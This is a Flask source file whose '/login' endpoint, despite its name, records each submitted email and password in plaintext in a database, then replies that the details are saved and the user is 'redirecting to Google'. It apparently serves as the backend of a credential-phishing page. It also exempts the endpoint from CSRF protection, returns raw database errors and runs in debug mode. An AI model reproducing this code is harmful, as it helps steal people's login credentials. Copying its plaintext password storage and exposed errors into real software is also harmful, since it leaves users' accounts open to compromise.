from flask import Flask, request, jsonify
from flask_wtf import FlaskForm
from wtforms import StringField, PasswordField
from wtforms.validators import DataRequired
from flask_wtf.csrf import CSRFProtect, generate_csrf
from flask_sqlalchemy import SQLAlchemy
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY')
csrf = CSRFProtect(app)

# PostgreSQL database configuration
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Database model
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password = db.Column(db.String(200), nullable=False)

# WTForms Login form
class LoginForm(FlaskForm):
    email = StringField('email', validators=[DataRequired()])
    passw = PasswordField('passw', validators=[DataRequired()])

# Initialize database (create tables)
with app.app_context():
    db.create_all()

@app.route('/')
def index():
    return app.send_static_file('index.html')

@app.route('/get_csrf_token')
def get_csrf_token():
    return jsonify({'csrf_token': generate_csrf()})

@app.route('/login', methods=['POST'])
@csrf.exempt  # Exempt CSRF for API (frontend JS)
def login():
    form = LoginForm(data=request.json)
    if form.validate():
        email = form.email.data
        password = form.passw.data

        try:
            existing_user = User.query.filter_by(email=email).first()
            if existing_user:
                return jsonify({'success': False, 'message': 'User already exists'}), 400

            new_user = User(email=email, password=password)
            db.session.add(new_user)
            db.session.commit()

            return jsonify({'success': True, 'message': 'Login details saved, redirecting to Google'})
        except Exception as e:
            return jsonify({'success': False, 'message': f'Database error: {str(e)}'}), 500
    else:
        print("Form validation errors:", form.errors)
        return jsonify({
            'success': False,
            'message': 'Invalid input',
            'errors': form.errors
        }), 400

if __name__ == '__main__':
    app.run(debug=True)
